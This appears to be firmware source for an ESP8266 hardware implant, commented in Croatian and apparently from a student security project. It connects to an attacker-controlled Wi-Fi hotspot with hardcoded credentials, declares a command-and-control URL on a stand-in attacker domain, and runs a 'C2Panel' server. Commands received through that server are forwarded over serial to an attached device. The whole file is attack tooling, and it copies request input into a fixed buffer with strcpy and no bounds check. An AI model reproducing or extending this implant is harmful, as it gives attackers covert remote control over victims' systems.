/*
 * Dijelovi koda preuzeti sa sljedećih izvora:
 * http://internetofthinking.blogspot.hr/2015/12/control-led-from-webserver-using.html
 * */

#include <ESP8266WiFi.h>
#include <EasyTransfer.h>
#include "sdk.h"
#include "C2Panel.h"

//Podaci od napadacevog AP-a
const char* ssid = "Karlo's iPhone";
const char* password = "foijezakon";

//Podaci od web servisa koji zadaje naredbe
const char* url = "http://atacker.ws/c2.php";

struct PACKET {
	int command;
	int param;
	char value[100];
};

struct CONFIG {
	bool serverStarted;
};

EasyTransfer ET;
PACKET packet;
CONFIG config;

void ledSignal(int interval = 100) {
	digitalWrite(BUILTIN_LED, LOW);
	delay(interval);
	digitalWrite(BUILTIN_LED, HIGH);
	delay(interval);
}

bool isBoardConnectedToWifi() {
	if (WiFi.status() != WL_CONNECTED) {
		if (config.serverStarted == true) {
			C2Panel::stopServer();
			config.serverStarted = false;
		}
		delay(100);
		Serial.print(".");
		ledSignal(100);
		return false;
	} else {
		if (config.serverStarted == false) {
			C2Panel::startServer();
			config.serverStarted = true;
			Serial.println("Server pokrenut!");
			Serial.print("http://");
			Serial.print(WiFi.localIP());
			Serial.println("/");
			ledSignal(40);
		}
		return true;
	}
}

void setup() {
	Serial.begin(115200);
	ET.begin(details(packet), &Serial);
	config.serverStarted = false;

	//Postavljanje statiče IP adrese uređaja na hotspotu tako da uvijek znamo na kojoj adresi je panel
	//IPAddress ip(172, 20, 10, 77);
	//IPAddress gateway(172, 20, 10, 77);
	//IPAddress subnet(255, 255, 255, 0);
	//WiFi.config(ip, gateway, subnet);

	WiFi.begin(ssid, password);

	//Inicijalizacija ugrađene LEDice, bit će korištena za signalizaciju komunikacije
	pinMode(BUILTIN_LED, OUTPUT);
	digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
	if (isBoardConnectedToWifi()) {
		C2Panel::PACKET request = C2Panel::requestHandler();
		switch (request.command) {
		case -1:
			delay(1000);
			break;
		case 0:
			break;
		case 1:
			packet.command = 1;
			packet.param = request.param;
			strcpy(packet.value, request.value);
			ET.sendData();
			break;
		case 2:
			packet.command = 2;
			packet.param = request.param;
			Serial.println("Strcopy!");
			//strcpy(packet.value, request.value);
			Serial.println(packet.value);
			ET.sendData();
			break;
		}
	} else {
		delay(1000);
	}
	delay(100);
}
